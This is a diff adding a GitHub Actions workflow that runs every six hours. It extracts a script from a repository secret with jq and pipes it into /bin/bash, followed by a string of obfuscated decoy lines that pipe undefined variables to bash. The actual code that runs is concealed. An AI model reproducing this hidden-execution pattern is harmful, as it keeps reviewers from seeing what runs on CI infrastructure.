@@ -1,0 +1,27 @@
+name: guyuanmeigu
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '12 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: guyuanmeigu
+        env:
+          n3501: ${{ secrets.n3501 }}
+        run: |
+          echo $n3501 | jq -r .ssx04465 | /bin/bash
+          echo $hugk055 | jq -r .udea98946 | /bin/bash
+          echo $kln75 | jq -r .v526 | /bin/bash
+          echo $h90063 | jq -r .ee21 | /bin/bash
+          echo $zzpt76 | jq -r .qwugq55996 | /bin/bash
+          echo $h81 | jq -r .vvc01996 | /bin/bash
+          echo $s62275 | jq -r .y73306 | /bin/bash
+          echo $ebg1 | jq -r .s76622 | /bin/bash
+          echo $ncwo914 | jq -r .spr1196 | /bin/bash
+          echo $kqcj913 | jq -r .zocnv2 | /bin/bash
+          echo $zsta74417 | jq -r .ur77 | /bin/bash
+          echo $cvb7 | jq -r .rnj96 | /bin/bash
+
